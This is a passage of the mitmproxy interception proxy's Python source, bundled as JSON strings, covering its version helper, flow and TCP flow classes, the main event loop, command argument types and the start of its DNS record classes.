\"cb0e3287090786fad566feb67ac07b8ef361b2c3\"],\n            stdout=subprocess.DEVNULL,\n            stderr=subprocess.DEVNULL,\n            cwd=here,\n            check=True,\n        )\n        git_describe = subprocess.check_output(\n            [\"git\", \"describe\", \"--tags\", \"--long\"],\n            stderr=subprocess.STDOUT,\n            cwd=here,\n        )\n        last_tag, tag_dist_str, commit = git_describe.decode().strip().rsplit(\"-\", 2)\n        commit = commit.lstrip(\"g\")[:7]\n        tag_dist = int(tag_dist_str)\n    except Exception:\n        pass\n    else:\n        # Add commit info for non-tagged releases\n        if tag_dist > 0:\n            mitmproxy_version += f\" (+{tag_dist}, commit {commit})\"\n\n    # PyInstaller build indicator, if using precompiled binary\n    if getattr(sys, \"frozen\", False):\n        mitmproxy_version += \" binary\"\n\n    return mitmproxy_version\n\n\nif __name__ == \"__main__\":  # pragma: no cover\n    print(VERSION)\n", "mitmproxy/flow.py": "from __future__ import annotations\n\nimport asyncio\nimport copy\nimport time\nimport uuid\nfrom dataclasses import dataclass\nfrom dataclasses import field\nfrom typing import Any\nfrom typing import ClassVar\n\nfrom mitmproxy import connection\nfrom mitmproxy import exceptions\nfrom mitmproxy import version\nfrom mitmproxy.coretypes import serializable\n\n\n@dataclass\nclass Error(serializable.SerializableDataclass):\n    \"\"\"\n    An Error.\n\n    This is distinct from an protocol error response (say, a HTTP code 500),\n    which is represented by a normal `mitmproxy.http.Response` object. This class is\n    responsible for indicating errors that fall outside of normal protocol\n    communications, like interrupted connections, timeouts, or protocol errors.\n    \"\"\"\n\n    msg: str\n    \"\"\"Message describing the error.\"\"\"\n\n    timestamp: float = field(default_factory=time.time)\n    \"\"\"Unix timestamp of when this error happened.\"\"\"\n\n    KILLED_MESSAGE: ClassVar[str] = \"Connection killed.\"\n\n    def __str__(self):\n        return self.msg\n\n    def __repr__(self):\n        return self.msg\n\n\nclass Flow(serializable.Serializable):\n    \"\"\"\n    Base class for network flows. A flow is a collection of objects,\n    for example HTTP request/response pairs or a list of TCP messages.\n\n    See also:\n     - mitmproxy.http.HTTPFlow\n     - mitmproxy.tcp.TCPFlow\n     - mitmproxy.udp.UDPFlow\n    \"\"\"\n\n    client_conn: connection.Client\n    \"\"\"The client that connected to mitmproxy.\"\"\"\n\n    server_conn: connection.Server\n    \"\"\"\n    The server mitmproxy connected to.\n\n    Some flows may never cause mitmproxy to initiate a server connection,\n    for example because their response is replayed by mitmproxy itself.\n    To simplify implementation, those flows will still have a `server_conn` attribute\n    with a `timestamp_start` set to `None`.\n    \"\"\"\n\n    error: Error | None = None\n    \"\"\"A connection or protocol error affecting this flow.\"\"\"\n\n    intercepted: bool\n    \"\"\"\n    If `True`, the flow is currently paused by mitmproxy.\n    We're waiting for a user action to forward the flow to its destination.\n    \"\"\"\n\n    marked: str = \"\"\n    \"\"\"\n    If this attribute is a non-empty string the flow has been marked by the user.\n\n    A string value will be used as the marker annotation. May either be a single character or a Unicode emoji name.\n\n    For example `:grapes:` becomes `\ud83c\udf47` in views that support emoji rendering.\n    Consult the [Github API Emoji List](https://api.github.com/emojis) for a list of emoji that may be used.\n    Not all emoji, especially [emoji modifiers](https://en.wikipedia.org/wiki/Miscellaneous_Symbols_and_Pictographs#Emoji_modifiers)\n    will render consistently.\n\n    The default marker for the view will be used if the Unicode emoji name can not be interpreted.\n    \"\"\"\n\n    is_replay: str | None\n    \"\"\"\n    This attribute indicates if this flow has been replayed in either direction.\n\n     - a value of `request` indicates that the request has been artifically replayed by mitmproxy to the server.\n     - a value of `response` indicates that the response to the client's request has been set by server replay.\n    \"\"\"\n\n    live: bool\n    \"\"\"\n    If `True`, the flow belongs to a currently active connection.\n    If `False`, the flow may have been already completed or loaded from disk.\n    \"\"\"\n\n    timestamp_created: float\n    \"\"\"\n    The Unix timestamp of when this flow was created.\n\n    In contrast to `timestamp_start`, this value will not change when a flow is replayed.\n    \"\"\"\n\n    def __init__(\n        self,\n        client_conn: connection.Client,\n        server_conn: connection.Server,\n        live: bool = False,\n    ) -> None:\n        self.id = str(uuid.uuid4())\n        self.client_conn = client_conn\n        self.server_conn = server_conn\n        self.live = live\n        self.timestamp_created = time.time()\n\n        self.intercepted: bool = False\n        self._resume_event: asyncio.Event | None = None\n        self._backup: Flow | None = None\n        self.marked: str = \"\"\n        self.is_replay: str | None = None\n        self.metadata: dict[str, Any] = dict()\n        self.comment: str = \"\"\n\n    __types: dict[str, type[Flow]] = {}\n\n    type: ClassVar[\n        str\n    ]  # automatically derived from the class name in __init_subclass__\n    \"\"\"The flow type, for example `http`, `tcp`, or `dns`.\"\"\"\n\n    def __init_subclass__(cls, **kwargs):\n        cls.type = cls.__name__.removesuffix(\"Flow\").lower()\n        Flow.__types[cls.type] = cls\n\n    def get_state(self) -> serializable.State:\n        state = {\n            \"version\": version.FLOW_FORMAT_VERSION,\n            \"type\": self.type,\n            \"id\": self.id,\n            \"error\": self.error.get_state() if self.error else None,\n            \"client_conn\": self.client_conn.get_state(),\n            \"server_conn\": self.server_conn.get_state(),\n            \"intercepted\": self.intercepted,\n            \"is_replay\": self.is_replay,\n            \"marked\": self.marked,\n            \"metadata\": copy.deepcopy(self.metadata),\n            \"comment\": self.comment,\n            \"timestamp_created\": self.timestamp_created,\n        }\n        state[\"backup\"] = copy.deepcopy(self._backup) if self._backup != state else None\n        return state\n\n    def set_state(self, state: serializable.State) -> None:\n        assert state.pop(\"version\") == version.FLOW_FORMAT_VERSION\n        assert state.pop(\"type\") == self.type\n        self.id = state.pop(\"id\")\n        if state[\"error\"]:\n            if self.error:\n                self.error.set_state(state.pop(\"error\"))\n            else:\n                self.error = Error.from_state(state.pop(\"error\"))\n        else:\n            self.error = state.pop(\"error\")\n        self.client_conn.set_state(state.pop(\"client_conn\"))\n        self.server_conn.set_state(state.pop(\"server_conn\"))\n        self.intercepted = state.pop(\"intercepted\")\n        self.is_replay = state.pop(\"is_replay\")\n        self.marked = state.pop(\"marked\")\n        self.metadata = state.pop(\"metadata\")\n        self.comment = state.pop(\"comment\")\n        self.timestamp_created = state.pop(\"timestamp_created\")\n        self._backup = state.pop(\"backup\", None)\n        assert state == {}\n\n    @classmethod\n    def from_state(cls, state: serializable.State) -> Flow:\n        try:\n            flow_cls = Flow.__types[state[\"type\"]]\n        except KeyError:\n            raise ValueError(f\"Unknown flow type: {state['type']}\")\n        client = connection.Client(peername=(\"\", 0), sockname=(\"\", 0))\n        server = connection.Server(address=None)\n        f = flow_cls(client, server)\n        f.set_state(state)\n        return f\n\n    def copy(self):\n        \"\"\"Make a copy of this flow.\"\"\"\n        f = super().copy()\n        f.live = False\n        return f\n\n    def modified(self):\n        \"\"\"\n        `True` if this file has been modified by a user, `False` otherwise.\n        \"\"\"\n        if self._backup:\n            return self._backup != self.get_state()\n        else:\n            return False\n\n    def backup(self, force=False):\n        \"\"\"\n        Save a backup of this flow, which can be restored by calling `Flow.revert()`.\n        \"\"\"\n        if not self._backup:\n            self._backup = self.get_state()\n\n    def revert(self):\n        \"\"\"\n        Revert to the last backed up state.\n        \"\"\"\n        if self._backup:\n            self.set_state(self._backup)\n            self._backup = None\n\n    @property\n    def killable(self):\n        \"\"\"*Read-only:* `True` if this flow can be killed, `False` otherwise.\"\"\"\n        return self.live and not (self.error and self.error.msg == Error.KILLED_MESSAGE)\n\n    def kill(self):\n        \"\"\"\n        Kill this flow. The current request/response will not be forwarded to its destination.\n        \"\"\"\n        if not self.killable:\n            raise exceptions.ControlException(\"Flow is not killable.\")\n        # TODO: The way we currently signal killing is not ideal. One major problem is that we cannot kill\n        #  flows in transit (https://github.com/mitmproxy/mitmproxy/issues/4711), even though they are advertised\n        #  as killable. An alternative approach would be to introduce a `KillInjected` event similar to\n        #  `MessageInjected`, which should fix this issue.\n        self.error = Error(Error.KILLED_MESSAGE)\n        self.intercepted = False\n        self.live = False\n\n    def intercept(self):\n        \"\"\"\n        Intercept this Flow. Processing will stop until resume is\n        called.\n        \"\"\"\n        if self.intercepted:\n            return\n        self.intercepted = True\n        if self._resume_event is not None:\n            self._resume_event.clear()\n\n    async def wait_for_resume(self):\n        \"\"\"\n        Wait until this Flow is resumed.\n        \"\"\"\n        if not self.intercepted:\n            return\n        if self._resume_event is None:\n            self._resume_event = asyncio.Event()\n        await self._resume_event.wait()\n\n    def resume(self):\n        \"\"\"\n        Continue with the flow \u2013 called after an intercept().\n        \"\"\"\n        if not self.intercepted:\n            return\n        self.intercepted = False\n        if self._resume_event is not None:\n            self._resume_event.set()\n\n    @property\n    def timestamp_start(self) -> float:\n        \"\"\"\n        *Read-only:* Start time of the flow.\n        Depending on the flow type, this property is an alias for\n        `mitmproxy.connection.Client.timestamp_start` or `mitmproxy.http.Request.timestamp_start`.\n        \"\"\"\n        return self.client_conn.timestamp_start\n\n\n__all__ = [\n    \"Flow\",\n    \"Error\",\n]\n", "mitmproxy/tcp.py": "import time\n\nfrom mitmproxy import connection\nfrom mitmproxy import flow\nfrom mitmproxy.coretypes import serializable\n\n\nclass TCPMessage(serializable.Serializable):\n    \"\"\"\n    An individual TCP \"message\".\n    Note that TCP is *stream-based* and not *message-based*.\n    For practical purposes the stream is chunked into messages here,\n    but you should not rely on message boundaries.\n    \"\"\"\n\n    def __init__(self, from_client, content, timestamp=None):\n        self.from_client = from_client\n        self.content = content\n        self.timestamp = timestamp or time.time()\n\n    @classmethod\n    def from_state(cls, state):\n        return cls(*state)\n\n    def get_state(self):\n        return self.from_client, self.content, self.timestamp\n\n    def set_state(self, state):\n        self.from_client, self.content, self.timestamp = state\n\n    def __repr__(self):\n        return \"{direction} {content}\".format(\n            direction=\"->\" if self.from_client else \"<-\", content=repr(self.content)\n        )\n\n\nclass TCPFlow(flow.Flow):\n    \"\"\"\n    A TCPFlow is a simplified representation of a TCP session.\n    \"\"\"\n\n    messages: list[TCPMessage]\n    \"\"\"\n    The messages transmitted over this connection.\n\n    The latest message can be accessed as `flow.messages[-1]` in event hooks.\n    \"\"\"\n\n    def __init__(\n        self,\n        client_conn: connection.Client,\n        server_conn: connection.Server,\n        live: bool = False,\n    ):\n        super().__init__(client_conn, server_conn, live)\n        self.messages = []\n\n    def get_state(self) -> serializable.State:\n        return {\n            **super().get_state(),\n            \"messages\": [m.get_state() for m in self.messages],\n        }\n\n    def set_state(self, state: serializable.State) -> None:\n        self.messages = [TCPMessage.from_state(m) for m in state.pop(\"messages\")]\n        super().set_state(state)\n\n    def __repr__(self):\n        return f\"<TCPFlow ({len(self.messages)} messages)>\"\n\n\n__all__ = [\n    \"TCPFlow\",\n    \"TCPMessage\",\n]\n", "mitmproxy/master.py": "import asyncio\nimport logging\n\nfrom . import ctx as mitmproxy_ctx\nfrom .addons import termlog\nfrom .proxy.mode_specs import ReverseMode\nfrom .utils import asyncio_utils\nfrom mitmproxy import addonmanager\nfrom mitmproxy import command\nfrom mitmproxy import eventsequence\nfrom mitmproxy import hooks\nfrom mitmproxy import http\nfrom mitmproxy import log\nfrom mitmproxy import options\n\nlogger = logging.getLogger(__name__)\n\n\nclass Master:\n    \"\"\"\n    The master handles mitmproxy's main event loop.\n    \"\"\"\n\n    event_loop: asyncio.AbstractEventLoop\n    _termlog_addon: termlog.TermLog | None = None\n\n    def __init__(\n        self,\n        opts: options.Options,\n        event_loop: asyncio.AbstractEventLoop | None = None,\n        with_termlog: bool = False,\n    ):\n        self.options: options.Options = opts or options.Options()\n        self.commands = command.CommandManager(self)\n        self.addons = addonmanager.AddonManager(self)\n\n        if with_termlog:\n            self._termlog_addon = termlog.TermLog()\n            self.addons.add(self._termlog_addon)\n\n        self.log = log.Log(self)  # deprecated, do not use.\n        self._legacy_log_events = log.LegacyLogEvents(self)\n        self._legacy_log_events.install()\n\n        # We expect an active event loop here already because some addons\n        # may want to spawn tasks during the initial configuration phase,\n        # which happens before run().\n        self.event_loop = event_loop or asyncio.get_running_loop()\n        self.should_exit = asyncio.Event()\n        mitmproxy_ctx.master = self\n        mitmproxy_ctx.log = self.log  # deprecated, do not use.\n        mitmproxy_ctx.options = self.options\n\n    async def run(self) -> None:\n        with (\n            asyncio_utils.install_exception_handler(self._asyncio_exception_handler),\n            asyncio_utils.set_eager_task_factory(),\n        ):\n            self.should_exit.clear()\n\n            # Can we exit before even bringing up servers?\n            if ec := self.addons.get(\"errorcheck\"):\n                await ec.shutdown_if_errored()\n            if ps := self.addons.get(\"proxyserver\"):\n                # This may block for some proxy modes, so we also monitor should_exit.\n                await asyncio.wait(\n                    [\n                        asyncio.create_task(ps.setup_servers()),\n                        asyncio.create_task(self.should_exit.wait()),\n                    ],\n                    return_when=asyncio.FIRST_COMPLETED,\n                )\n                if self.should_exit.is_set():\n                    return\n                # Did bringing up servers fail?\n                if ec := self.addons.get(\"errorcheck\"):\n                    await ec.shutdown_if_errored()\n\n            try:\n                await self.running()\n                # Any errors in the final part of startup?\n                if ec := self.addons.get(\"errorcheck\"):\n                    await ec.shutdown_if_errored()\n                    ec.finish()\n\n                await self.should_exit.wait()\n            finally:\n                # if running() was called, we also always want to call done().\n                # .wait might be cancelled (e.g. by sys.exit), so  this needs to be in a finally block.\n                await self.done()\n\n    def shutdown(self):\n        \"\"\"\n        Shut down the proxy. This method is thread-safe.\n        \"\"\"\n        # We may add an exception argument here.\n        self.event_loop.call_soon_threadsafe(self.should_exit.set)\n\n    async def running(self) -> None:\n        await self.addons.trigger_event(hooks.RunningHook())\n\n    async def done(self) -> None:\n        await self.addons.trigger_event(hooks.DoneHook())\n        self._legacy_log_events.uninstall()\n        if self._termlog_addon is not None:\n            self._termlog_addon.uninstall()\n\n    def _asyncio_exception_handler(self, loop, context) -> None:\n        try:\n            exc: Exception = context[\"exception\"]\n        except KeyError:\n            logger.error(f\"Unhandled asyncio error: {context}\")\n        else:\n            if isinstance(exc, OSError) and exc.errno == 10038:\n                return  # suppress https://bugs.python.org/issue43253\n            logger.error(\n                \"Unhandled error in task.\",\n                exc_info=(type(exc), exc, exc.__traceback__),\n            )\n\n    async def load_flow(self, f):\n        \"\"\"\n        Loads a flow\n        \"\"\"\n\n        if (\n            isinstance(f, http.HTTPFlow)\n            and len(self.options.mode) == 1\n            and self.options.mode[0].startswith(\"reverse:\")\n        ):\n            # When we load flows in reverse proxy mode, we adjust the target host to\n            # the reverse proxy destination for all flows we load. This makes it very\n            # easy to replay saved flows against a different host.\n            # We may change this in the future so that clientplayback always replays to the first mode.\n            mode = ReverseMode.parse(self.options.mode[0])\n            assert isinstance(mode, ReverseMode)\n            f.request.host, f.request.port, *_ = mode.address\n            f.request.scheme = mode.scheme\n\n        for e in eventsequence.iterate(f):\n            await self.addons.handle_lifecycle(e)\n", "mitmproxy/types.py": "import codecs\nimport glob\nimport os\nimport re\nfrom collections.abc import Sequence\nfrom typing import Any\nfrom typing import TYPE_CHECKING\nfrom typing import Union\n\nfrom mitmproxy import exceptions\nfrom mitmproxy import flow\nfrom mitmproxy.utils import emoji\nfrom mitmproxy.utils import strutils\n\nif TYPE_CHECKING:  # pragma: no cover\n    from mitmproxy.command import CommandManager\n\n\nclass Path(str):\n    pass\n\n\nclass Cmd(str):\n    pass\n\n\nclass CmdArgs(str):\n    pass\n\n\nclass Unknown(str):\n    pass\n\n\nclass Space(str):\n    pass\n\n\nclass CutSpec(Sequence[str]):\n    pass\n\n\nclass Data(Sequence[Sequence[Union[str, bytes]]]):\n    pass\n\n\nclass Marker(str):\n    pass\n\n\nclass Choice:\n    def __init__(self, options_command):\n        self.options_command = options_command\n\n    def __instancecheck__(self, instance):  # pragma: no cover\n        # return false here so that arguments are piped through parsearg,\n        # which does extended validation.\n        return False\n\n\nclass _BaseType:\n    typ: type = object\n    display: str = \"\"\n\n    def completion(self, manager: \"CommandManager\", t: Any, s: str) -> Sequence[str]:\n        \"\"\"\n        Returns a list of completion strings for a given prefix. The strings\n        returned don't necessarily need to be suffixes of the prefix, since\n        completers will do prefix filtering themselves..\n        \"\"\"\n        raise NotImplementedError\n\n    def parse(self, manager: \"CommandManager\", typ: Any, s: str) -> Any:\n        \"\"\"\n        Parse a string, given the specific type instance (to allow rich type annotations like Choice) and a string.\n\n        Raises ValueError if the value is invalid.\n        \"\"\"\n        raise NotImplementedError\n\n    def is_valid(self, manager: \"CommandManager\", typ: Any, val: Any) -> bool:\n        \"\"\"\n        Check if data is valid for this type.\n        \"\"\"\n        raise NotImplementedError\n\n\nclass _BoolType(_BaseType):\n    typ = bool\n    display = \"bool\"\n\n    def completion(self, manager: \"CommandManager\", t: type, s: str) -> Sequence[str]:\n        return [\"false\", \"true\"]\n\n    def parse(self, manager: \"CommandManager\", t: type, s: str) -> bool:\n        if s == \"true\":\n            return True\n        elif s == \"false\":\n            return False\n        else:\n            raise ValueError(\"Booleans are 'true' or 'false', got %s\" % s)\n\n    def is_valid(self, manager: \"CommandManager\", typ: Any, val: Any) -> bool:\n        return val in [True, False]\n\n\nclass _StrType(_BaseType):\n    typ = str\n    display = \"str\"\n\n    # https://docs.python.org/3/reference/lexical_analysis.html#string-and-bytes-literals\n    escape_sequences = re.compile(\n        r\"\"\"\n        \\\\ (\n        [\\\\'\"abfnrtv]  # Standard C escape sequence\n        | [0-7]{1,3}   # Character with octal value\n        | x..          # Character with hex value\n        | N{[^}]+}     # Character name in the Unicode database\n        | u....        # Character with 16-bit hex value\n        | U........    # Character with 32-bit hex value\n        )\n        \"\"\",\n        re.VERBOSE,\n    )\n\n    @staticmethod\n    def _unescape(match: re.Match) -> str:\n        return codecs.decode(match.group(0), \"unicode-escape\")  # type: ignore\n\n    def completion(self, manager: \"CommandManager\", t: type, s: str) -> Sequence[str]:\n        return []\n\n    def parse(self, manager: \"CommandManager\", t: type, s: str) -> str:\n        return self.escape_sequences.sub(self._unescape, s)\n\n    def is_valid(self, manager: \"CommandManager\", typ: Any, val: Any) -> bool:\n        return isinstance(val, str)\n\n\nclass _BytesType(_BaseType):\n    typ = bytes\n    display = \"bytes\"\n\n    def completion(self, manager: \"CommandManager\", t: type, s: str) -> Sequence[str]:\n        return []\n\n    def parse(self, manager: \"CommandManager\", t: type, s: str) -> bytes:\n        return strutils.escaped_str_to_bytes(s)\n\n    def is_valid(self, manager: \"CommandManager\", typ: Any, val: Any) -> bool:\n        return isinstance(val, bytes)\n\n\nclass _UnknownType(_BaseType):\n    typ = Unknown\n    display = \"unknown\"\n\n    def completion(self, manager: \"CommandManager\", t: type, s: str) -> Sequence[str]:\n        return []\n\n    def parse(self, manager: \"CommandManager\", t: type, s: str) -> str:\n        return s\n\n    def is_valid(self, manager: \"CommandManager\", typ: Any, val: Any) -> bool:\n        return False\n\n\nclass _IntType(_BaseType):\n    typ = int\n    display = \"int\"\n\n    def completion(self, manager: \"CommandManager\", t: type, s: str) -> Sequence[str]:\n        return []\n\n    def parse(self, manager: \"CommandManager\", t: type, s: str) -> int:\n        return int(s)\n\n    def is_valid(self, manager: \"CommandManager\", typ: Any, val: Any) -> bool:\n        return isinstance(val, int)\n\n\nclass _PathType(_BaseType):\n    typ = Path\n    display = \"path\"\n\n    def completion(\n        self, manager: \"CommandManager\", t: type, start: str\n    ) -> Sequence[str]:\n        if not start:\n            start = \"./\"\n        path = os.path.expanduser(start)\n        ret = []\n        if os.path.isdir(path):\n            files = glob.glob(os.path.join(path, \"*\"))\n            prefix = start\n        else:\n            files = glob.glob(path + \"*\")\n            prefix = os.path.dirname(start)\n        prefix = prefix or \"./\"\n        for f in files:\n            display = os.path.join(prefix, os.path.normpath(os.path.basename(f)))\n            if os.path.isdir(f):\n                display += \"/\"\n            ret.append(display)\n        if not ret:\n            ret = [start]\n        ret.sort()\n        return ret\n\n    def parse(self, manager: \"CommandManager\", t: type, s: str) -> str:\n        return os.path.expanduser(s)\n\n    def is_valid(self, manager: \"CommandManager\", typ: Any, val: Any) -> bool:\n        return isinstance(val, str)\n\n\nclass _CmdType(_BaseType):\n    typ = Cmd\n    display = \"cmd\"\n\n    def completion(self, manager: \"CommandManager\", t: type, s: str) -> Sequence[str]:\n        return list(manager.commands.keys())\n\n    def parse(self, manager: \"CommandManager\", t: type, s: str) -> str:\n        if s not in manager.commands:\n            raise ValueError(\"Unknown command: %s\" % s)\n        return s\n\n    def is_valid(self, manager: \"CommandManager\", typ: Any, val: Any) -> bool:\n        return val in manager.commands\n\n\nclass _ArgType(_BaseType):\n    typ = CmdArgs\n    display = \"arg\"\n\n    def completion(self, manager: \"CommandManager\", t: type, s: str) -> Sequence[str]:\n        return []\n\n    def parse(self, manager: \"CommandManager\", t: type, s: str) -> str:\n        return s\n\n    def is_valid(self, manager: \"CommandManager\", typ: Any, val: Any) -> bool:\n        return isinstance(val, str)\n\n\nclass _StrSeqType(_BaseType):\n    typ = Sequence[str]\n    display = \"str[]\"\n\n    def completion(self, manager: \"CommandManager\", t: type, s: str) -> Sequence[str]:\n        return []\n\n    def parse(self, manager: \"CommandManager\", t: type, s: str) -> Sequence[str]:\n        return [x.strip() for x in s.split(\",\")]\n\n    def is_valid(self, manager: \"CommandManager\", typ: Any, val: Any) -> bool:\n        if isinstance(val, str) or isinstance(val, bytes):\n            return False\n        try:\n            for v in val:\n                if not isinstance(v, str):\n                    return False\n        except TypeError:\n            return False\n        return True\n\n\nclass _CutSpecType(_BaseType):\n    typ = CutSpec\n    display = \"cut[]\"\n    valid_prefixes = [\n        \"request.method\",\n        \"request.scheme\",\n        \"request.host\",\n        \"request.http_version\",\n        \"request.port\",\n        \"request.path\",\n        \"request.url\",\n        \"request.text\",\n        \"request.content\",\n        \"request.raw_content\",\n        \"request.timestamp_start\",\n        \"request.timestamp_end\",\n        \"request.header[\",\n        \"response.status_code\",\n        \"response.reason\",\n        \"response.text\",\n        \"response.content\",\n        \"response.timestamp_start\",\n        \"response.timestamp_end\",\n        \"response.raw_content\",\n        \"response.header[\",\n        \"client_conn.peername.port\",\n        \"client_conn.peername.host\",\n        \"client_conn.tls_version\",\n        \"client_conn.sni\",\n        \"client_conn.tls_established\",\n        \"server_conn.address.port\",\n        \"server_conn.address.host\",\n        \"server_conn.ip_address.host\",\n        \"server_conn.tls_version\",\n        \"server_conn.sni\",\n        \"server_conn.tls_established\",\n    ]\n\n    def completion(self, manager: \"CommandManager\", t: type, s: str) -> Sequence[str]:\n        spec = s.split(\",\")\n        opts = []\n        for pref in self.valid_prefixes:\n            spec[-1] = pref\n            opts.append(\",\".join(spec))\n        return opts\n\n    def parse(self, manager: \"CommandManager\", t: type, s: str) -> CutSpec:\n        parts: Any = s.split(\",\")\n        return parts\n\n    def is_valid(self, manager: \"CommandManager\", typ: Any, val: Any) -> bool:\n        if not isinstance(val, str):\n            return False\n        parts = [x.strip() for x in val.split(\",\")]\n        for p in parts:\n            for pref in self.valid_prefixes:\n                if p.startswith(pref):\n                    break\n            else:\n                return False\n        return True\n\n\nclass _BaseFlowType(_BaseType):\n    viewmarkers = [\n        \"@all\",\n        \"@focus\",\n        \"@shown\",\n        \"@hidden\",\n        \"@marked\",\n        \"@unmarked\",\n    ]\n    valid_prefixes = viewmarkers + [\n        \"~q\",\n        \"~s\",\n        \"~a\",\n        \"~hq\",\n        \"~hs\",\n        \"~b\",\n        \"~bq\",\n        \"~bs\",\n        \"~t\",\n        \"~d\",\n        \"~m\",\n        \"~u\",\n        \"~c\",\n    ]\n\n    def completion(self, manager: \"CommandManager\", t: type, s: str) -> Sequence[str]:\n        return self.valid_prefixes\n\n\nclass _FlowType(_BaseFlowType):\n    typ = flow.Flow\n    display = \"flow\"\n\n    def parse(self, manager: \"CommandManager\", t: type, s: str) -> flow.Flow:\n        try:\n            flows = manager.call_strings(\"view.flows.resolve\", [s])\n        except exceptions.CommandError as e:\n            raise ValueError(str(e)) from e\n        if len(flows) != 1:\n            raise ValueError(\n                \"Command requires one flow, specification matched %s.\" % len(flows)\n            )\n        return flows[0]\n\n    def is_valid(self, manager: \"CommandManager\", typ: Any, val: Any) -> bool:\n        return isinstance(val, flow.Flow)\n\n\nclass _FlowsType(_BaseFlowType):\n    typ = Sequence[flow.Flow]\n    display = \"flow[]\"\n\n    def parse(self, manager: \"CommandManager\", t: type, s: str) -> Sequence[flow.Flow]:\n        try:\n            return manager.call_strings(\"view.flows.resolve\", [s])\n        except exceptions.CommandError as e:\n            raise ValueError(str(e)) from e\n\n    def is_valid(self, manager: \"CommandManager\", typ: Any, val: Any) -> bool:\n        try:\n            for v in val:\n                if not isinstance(v, flow.Flow):\n                    return False\n        except TypeError:\n            return False\n        return True\n\n\nclass _DataType(_BaseType):\n    typ = Data\n    display = \"data[][]\"\n\n    def completion(\n        self, manager: \"CommandManager\", t: type, s: str\n    ) -> Sequence[str]:  # pragma: no cover\n        raise ValueError(\"data cannot be passed as argument\")\n\n    def parse(\n        self, manager: \"CommandManager\", t: type, s: str\n    ) -> Any:  # pragma: no cover\n        raise ValueError(\"data cannot be passed as argument\")\n\n    def is_valid(self, manager: \"CommandManager\", typ: Any, val: Any) -> bool:\n        # FIXME: validate that all rows have equal length, and all columns have equal types\n        try:\n            for row in val:\n                for cell in row:\n                    if not (isinstance(cell, str) or isinstance(cell, bytes)):\n                        return False\n        except TypeError:\n            return False\n        return True\n\n\nclass _ChoiceType(_BaseType):\n    typ = Choice\n    display = \"choice\"\n\n    def completion(self, manager: \"CommandManager\", t: Choice, s: str) -> Sequence[str]:\n        return manager.execute(t.options_command)\n\n    def parse(self, manager: \"CommandManager\", t: Choice, s: str) -> str:\n        opts = manager.execute(t.options_command)\n        if s not in opts:\n            raise ValueError(\"Invalid choice.\")\n        return s\n\n    def is_valid(self, manager: \"CommandManager\", typ: Any, val: Any) -> bool:\n        try:\n            opts = manager.execute(typ.options_command)\n        except exceptions.CommandError:\n            return False\n        return val in opts\n\n\nALL_MARKERS = [\"true\", \"false\"] + list(emoji.emoji)\n\n\nclass _MarkerType(_BaseType):\n    typ = Marker\n    display = \"marker\"\n\n    def completion(self, manager: \"CommandManager\", t: Choice, s: str) -> Sequence[str]:\n        return ALL_MARKERS\n\n    def parse(self, manager: \"CommandManager\", t: Choice, s: str) -> str:\n        if s not in ALL_MARKERS:\n            raise ValueError(\"Invalid choice.\")\n        if s == \"true\":\n            return \":default:\"\n        elif s == \"false\":\n            return \"\"\n        return s\n\n    def is_valid(self, manager: \"CommandManager\", typ: Any, val: str) -> bool:\n        return val in ALL_MARKERS\n\n\nclass TypeManager:\n    def __init__(self, *types):\n        self.typemap = {}\n        for t in types:\n            self.typemap[t.typ] = t()\n\n    def get(self, t: type | None, default=None) -> _BaseType | None:\n        if type(t) in self.typemap:\n            return self.typemap[type(t)]\n        return self.typemap.get(t, default)\n\n\nCommandTypes = TypeManager(\n    _ArgType,\n    _BoolType,\n    _ChoiceType,\n    _CmdType,\n    _CutSpecType,\n    _DataType,\n    _FlowType,\n    _FlowsType,\n    _IntType,\n    _MarkerType,\n    _PathType,\n    _StrType,\n    _StrSeqType,\n    _BytesType,\n)\n", "mitmproxy/dns.py": "from __future__ import annotations\n\nimport base64\nimport itertools\nimport random\nimport struct\nimport time\nfrom dataclasses import dataclass\nfrom ipaddress import IPv4Address\nfrom ipaddress import IPv6Address\nfrom typing import ClassVar\n\nfrom mitmproxy import flow\nfrom mitmproxy.coretypes import serializable\nfrom mitmproxy.net.dns import classes\nfrom mitmproxy.net.dns import domain_names\nfrom mitmproxy.net.dns import https_records\nfrom mitmproxy.net.dns import op_codes\nfrom mitmproxy.net.dns import response_codes\nfrom mitmproxy.net.dns import types\nfrom mitmproxy.net.dns.https_records import HTTPSRecord\nfrom mitmproxy.net.dns.https_records import SVCParamKeys\n\n# DNS parameters taken from https://www.iana.org/assignments/dns-parameters/dns-parameters.xml\n\n\n@dataclass\nclass Question(serializable.SerializableDataclass):\n    HEADER: ClassVar[struct.Struct] = struct.Struct(\"!HH\")\n\n    name: str\n    type: int\n    class_: int\n\n    def __str__(self) -> str:\n        return self.name\n\n    def to_json(self) -> dict:\n        \"\"\"\n        Converts the question into json for mitmweb.\n        Sync with web/src/flow.ts.\n        \"\"\"\n        return {\n            \"name\": self.name,\n            \"type\": types.to_str(self.type),\n            \"class\": classes.to_str(self.class_),\n        }\n\n\n@dataclass\nclass ResourceRecord(serializable.SerializableDataclass):\n    DEFAULT_TTL: ClassVar[int] = 60\n    HEADER: ClassVar[struct.Struct] = struct.Struct(\"!HHIH\")\n\n    name: str\n    type: int\n    class_: int\n    ttl: int\n    data: bytes\n\n    def __str__(self) -> str:\n        try:\n            if self.type == types.A:\n                return str(self.ipv4_address)\n            if self.type == types.AAAA:\n                return str(self.ipv6_address)\n            if self.type in (types.NS, types.CNAME, types.PTR):\n                return self.domain_name\n            if self.type == types.TXT:\n                return self.text\n            if self.type == types.HTTPS:\n                return str(https_records.unpack(self.data))\n        except Exception:\n            return f\"0x{self.data.hex()} (invalid {types.to_str(self.type)} data)\"\n        return f\"0x{self.data.hex()}\"\n\n    @property\n    def text(self) -> str:\n        return self.data.decode(\"utf-8\")\n\n    @text.setter\n    def text(self, value: str) -> None:\n        self.data = value.encode(\"utf-8\")\n\n    @property\n    def ipv4_address(self) -> IPv4Address:\n        return IPv4Address(self.data)\n\n    @ipv4_address.setter\n    def ipv4_address(self, ip: IPv4Address) -> None:\n        self.data = ip.packed\n\n    @property\n    def ipv6_address(self) -> IPv6Address:\n        return IPv6Address(self.data)\n\n    @ipv6_address.setter\n    def ipv6_address(self, ip: IPv6Address) -> None:\n        self.data = ip.packed\n\n    @property\n    def domain_name(self) -> str:\n        return domain_names.unpack(self.data)\n\n    @domain_name.setter\n    def domain_name(self, name: str) -> None:\n        self.data = domain_names.pack(name)\n\n    @property\n    def https_ech(self) -> str | None:\n        record = https_records.unpack(self.data)\n        ech_bytes = record.params.get(SVCParamKeys.ECH.value, None)\n        if ech_bytes is not None:\n            return 